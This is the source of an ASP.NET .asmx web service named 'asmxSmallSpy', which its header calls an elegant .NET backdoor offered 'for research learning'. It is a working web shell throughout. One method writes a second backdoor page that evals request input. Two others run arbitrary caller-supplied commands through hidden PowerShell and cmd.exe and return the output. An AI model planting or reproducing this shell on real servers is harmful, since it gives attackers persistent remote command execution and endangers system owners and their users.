<%@ WebService Language="C#" class="asmxSmallSpy"%>
using System;
using System.IO;
using System.Web;
using System.Web.Services;
using System.Diagnostics;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.Web.Script.Services;
[System.Web.Script.Services.ScriptService]
[WebService(Namespace = "http://tempuri.org/" ,Description ="<B>Just for Research Learning, Do Not Abuse It! Written By <a href='https://github.com/Ivan1ee'>Ivan1ee</a></B>" , Name ="asmxSmallSpy —— .NET下的又一款优雅的后门")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class asmxSmallSpy : System.Web.Services.WebService
    {
        /**
        Code by Ivan Lee@github.com
        Date: 2018-07-16
        No Pain,No Gain!
        **/
        
        [System.ComponentModel.ToolboxItem(false)]
        [WebMethod]
        /**
        Create A BackDoor
        **/
        public string webShell()
        {
            StreamWriter wickedly = File.CreateText(HttpContext.Current.Server.MapPath("Ivan.aspx"));
            wickedly.Write("<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"Ivan\"],\"unsafe\");%>");
            wickedly.Flush();
            wickedly.Close();
            return "Wickedly";
        }

        [WebMethod]
        /**
        Exec Command via powerShell 
        **/
        public string powerShell(string input)
        {
            Process pr = new Process();
            pr.StartInfo.FileName = "powershell.exe";
            pr.StartInfo.RedirectStandardOutput = true;
            pr.StartInfo.UseShellExecute = false;
            pr.StartInfo.Arguments = "/c " + input;
            pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            pr.Start();
            StreamReader osr = pr.StandardOutput;
            String ocmd = osr.ReadToEnd();
            osr.Close();
            osr.Dispose();
            return ocmd;
        }

        
        [WebMethod]
        /**
        Exec Command via cmdShell 
        **/
        public string cmdShell(string input)
        {
            Process pr = new Process();
            pr.StartInfo.FileName = "cmd.exe";
            pr.StartInfo.RedirectStandardOutput = true;
            pr.StartInfo.UseShellExecute = false;
            pr.StartInfo.Arguments = "/c " + input;
            pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            pr.Start();
            StreamReader osr = pr.StandardOutput;
            String ocmd = osr.ReadToEnd();
            osr.Close();
            osr.Dispose();
            return ocmd;
        }
    }


